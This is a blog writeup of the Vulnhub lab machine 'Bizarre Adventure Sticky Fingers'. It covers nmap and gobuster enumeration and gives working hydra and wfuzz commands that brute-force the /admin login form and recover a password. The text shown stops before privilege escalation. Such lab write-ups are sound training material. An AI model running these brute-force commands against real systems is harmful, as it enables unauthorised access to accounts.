---
title: Vulnhub - Bizarre Adventure Sticky Fingers
description: My writeup on Bizarre Adventure Sticky Fingers box.
categories:
 - vulnhub
tags: vulnhub hydra ssh base64 kernel
---

![](https://i.kym-cdn.com/photos/images/original/001/420/906/1c2.jpg)

You can find the machine there > [Bizarre Adventure Sticky Fingers](https://www.vulnhub.com/entry/bizarre-adventure-sticky-fingers,560/){:target="_blank"}

## Summary

To be honest, i didn't really like this box. The way you get shell is waste of time anyway..! We start by finding an admin page and brute force it using hydra after looooooong time we get the password. Then after some decoding/decrypting we get a password, from the images we get the username and we're in. Privilege escalation to root is a simple kernel exploit. Let's pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.17
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 00:26 EEST
Nmap scan report for stickyfingers.zte.com.cn (192.168.1.17)
Host is up (0.00056s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
5355/tcp open  llmnr
MAC Address: 08:00:27:7C:38:71 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds
$ nmap -p 22,53,80,5355 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 00:27 EEST
Nmap scan report for stickyfingers.zte.com.cn (192.168.1.17)
Host is up (0.00048s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c6:35:09:72:d4:d9:5c:17:56:06:f9:53:c4:90:2f:8d (RSA)
|   256 98:52:48:9e:cc:64:46:94:43:2a:70:52:d1:79:8c:4c (ECDSA)
|_  256 c0:57:d2:9f:fb:70:c8:c6:66:5e:16:17:5b:08:b9:8f (ED25519)
53/tcp   open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: NIVEL 1
5355/tcp open  llmnr?
```

Port 80 has a static website nothing interesting, let's run a `gobuster` scan.

```
$ gobuster dir -q -u http://$ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
/index.html (Status: 200)
/images (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
```

`/admin` has a login page, tried some classic stuff like `admin:admin` `guest:guest` etc but nothing. I checked the `/images` folder and i found a file called `Flag.txt.txt` this file has 2 possible usernames in:

```
$ curl http://192.168.1.17/images/Flag.txt.txt
EASY EASY EASY

Zipperman is cool!

Bucciarati
```

Let's fire up hydra on login page. Here is the stupid part.. we have to wait l000000000000000ng time to get the password because the password is in line `1044216` :

```
$ cat /usr/share/wordlists/rockyou.txt | grep -n "Password@123" 
1044216:Password@123
```

Just grab it and save your time. :smile: I'll make another wordlist with this password in to show you the hydra command.

```
$ hydra -l Zipperman -P wordlist.txt $ip http-post-form "/admin/index.php:username=Zipperman&pass=^PASS^:Login Failed"

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-24 00:40:34
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking http-post-form://192.168.1.17:80/admin/index.php:username=Zipperman&pass=^PASS^:Login Failed
[80][http-post-form] host: 192.168.1.17   login: Zipperman   password: Password@123
```

You can also use `wfuzz`:

```
$ wfuzz -c -w wordlist.txt -d "username=Zipperman&pass=FUZZ" --hc 200 http://192.168.1.17/admin/index.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.17/admin/index.php
Total requests: 4

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                 
===================================================================

000000004:   302        88 L     176 W    2643 Ch     "Password@123"                   
```
